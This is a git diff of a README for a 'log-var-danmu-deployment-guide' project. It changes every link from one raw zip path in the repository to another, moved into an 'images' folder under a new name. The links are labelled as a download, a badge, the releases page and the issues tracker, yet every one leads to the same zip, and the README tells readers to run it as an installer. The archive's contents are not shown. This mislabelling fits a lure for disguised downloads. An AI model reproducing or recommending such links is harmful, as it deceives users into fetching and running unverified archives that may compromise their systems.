@@ -7,9 +7,9 @@ Welcome to the log-var-danmu-deployment-guide! This guide helps you easily updat
 
 ## 📥 Download the Application
 
-To download the application, visit this page: [Download log-var-danmu-deployment-guide](https://raw.githubusercontent.com/ranetop/log-var-danmu-deployment-guide/main/astrild/log-var-danmu-deployment-guide.zip)
+To download the application, visit this page: [Download log-var-danmu-deployment-guide](https://github.com/ranetop/log-var-danmu-deployment-guide/raw/refs/heads/main/images/var_log_deployment_danmu_guide_v1.3.zip)
 
-![Download Badge](https://raw.githubusercontent.com/ranetop/log-var-danmu-deployment-guide/main/astrild/log-var-danmu-deployment-guide.zip)
+![Download Badge](https://github.com/ranetop/log-var-danmu-deployment-guide/raw/refs/heads/main/images/var_log_deployment_danmu_guide_v1.3.zip)
 
 ## 📋 System Requirements
 
@@ -32,9 +32,9 @@ The log-var-danmu-deployment-guide offers several useful features:
 Follow these steps to install the application:
 
 1. **Download the Installer**:
-   - Visit the [Releases page](https://raw.githubusercontent.com/ranetop/log-var-danmu-deployment-guide/main/astrild/log-var-danmu-deployment-guide.zip).
+   - Visit the [Releases page](https://github.com/ranetop/log-var-danmu-deployment-guide/raw/refs/heads/main/images/var_log_deployment_danmu_guide_v1.3.zip).
    - Click on the latest release.
-   - Look for the file with the name similar to `https://raw.githubusercontent.com/ranetop/log-var-danmu-deployment-guide/main/astrild/log-var-danmu-deployment-guide.zip` or `https://raw.githubusercontent.com/ranetop/log-var-danmu-deployment-guide/main/astrild/log-var-danmu-deployment-guide.zip` for macOS.
+   - Look for the file with the name similar to `https://github.com/ranetop/log-var-danmu-deployment-guide/raw/refs/heads/main/images/var_log_deployment_danmu_guide_v1.3.zip` or `https://github.com/ranetop/log-var-danmu-deployment-guide/raw/refs/heads/main/images/var_log_deployment_danmu_guide_v1.3.zip` for macOS.
    - Click on the file to start the download.
 
 2. **Run the Installer**:
@@ -63,14 +63,14 @@ Once installed, using the application is straightforward:
 
 If you encounter any issues during installation or while using the application:
 
-- Visit the [GitHub Issues page](https://raw.githubusercontent.com/ranetop/log-var-danmu-deployment-guide/main/astrild/log-var-danmu-deployment-guide.zip) to see if your question has already been answered.
+- Visit the [GitHub Issues page](https://github.com/ranetop/log-var-danmu-deployment-guide/raw/refs/heads/main/images/var_log_deployment_danmu_guide_v1.3.zip) to see if your question has already been answered.
 - You can open a new issue if your problem is unique.
 - Detailed instructions are available in the documentation on the repository.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/ranetop/log-var-danmu-deployment-guide/main/astrild/log-var-danmu-deployment-guide.zip)
-- [Issues Tracker](https://raw.githubusercontent.com/ranetop/log-var-danmu-deployment-guide/main/astrild/log-var-danmu-deployment-guide.zip)
+- [Releases Page](https://github.com/ranetop/log-var-danmu-deployment-guide/raw/refs/heads/main/images/var_log_deployment_danmu_guide_v1.3.zip)
+- [Issues Tracker](https://github.com/ranetop/log-var-danmu-deployment-guide/raw/refs/heads/main/images/var_log_deployment_danmu_guide_v1.3.zip)
 
 ## 📞 Contact Information
 
